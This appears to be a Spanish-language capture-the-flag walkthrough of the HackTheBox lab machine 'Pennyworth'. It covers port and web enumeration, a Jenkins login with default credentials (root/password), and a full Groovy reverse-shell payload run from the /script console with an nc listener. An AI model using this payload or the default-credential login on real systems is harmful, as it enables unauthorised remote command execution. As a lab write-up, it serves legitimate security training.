---
description: Starting Point HTB
---

# Pennyworth

## Enumeración

```
#Enumeración de puertos abiertos
nmap -p- --open -n -Pn -min-rate 5000 10.129.158.116

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-10 11:21 CET
Nmap scan report for 10.129.158.116
Host is up (0.12s latency).
Not shown: 65300 filtered tcp ports (no-response), 234 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxy

#Enumeración de servicios y versiones
nmap -p8080 -sC -sV -n -Pn 10.129.158.116

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-10 11:23 CET
Nmap scan report for 10.129.158.116
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)


#Enumeración web
whatweb 10.129.158.116:8080
http://10.129.158.116:8080 [403 Forbidden] Cookies[JSESSIONID.24a3b9cc], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.39.v20210325)], HttpOnly[JSESSIONID.24a3b9cc], IP[10.129.158.116], Jenkins[2.289.1], Jetty[9.4.39.v20210325], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://10.129.158.116:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.24a3b9cc], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.39.v20210325)], HttpOnly[JSESSIONID.24a3b9cc], IP[10.129.158.116], Jenkins[2.289.1], Jetty[9.4.39.v20210325], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]

```

## WEB

Nos encontramos el siguiente login, y probamos distintos usuarios y contraseñas por defecto.

![](<../.gitbook/assets/image (35) (1) (1).png>)

* Usuario: root&#x20;
* Contraseña: password

Tras buscar un poco por internet acerca de Jenkins vemos que existe la posibilidad de hacer comandos mediante groovy, para ello tenemos que acceder a la pestaña "/script"

Y tenemos un listado de posibles _Reverse Shell_ para conectarnos a la máquina objetivo:

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy-alternative-1" %}
Cheatsheet Reverse Shell
{% endembed %}

Vemos que la forma de crearlo mediante groovy es la siguiente:

```
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Por lo que tendremos que modificar, suponemos que la IP debemos poner la nuestra que es a la que se conectará, por otro lado el puerto al que queremos y que tendremos que ponernos en escucha y por úlimo la shell que se creará. Vemos que por defecto pone cmd.exe pero queremos enviarlo desde una máquina Linux por lo que habrá que modificarlo:

```
String host="nuestraIP";
int port=7777;
String cmd="/bin/bash";
```

Una vez con todo esto nos ponemos en escucha antes de ejecutarlo:

```
sudo nc -nlvp 7777
```

Y nos llegará nuestra Shell, buscamos la flag la introducimos y está hecho.

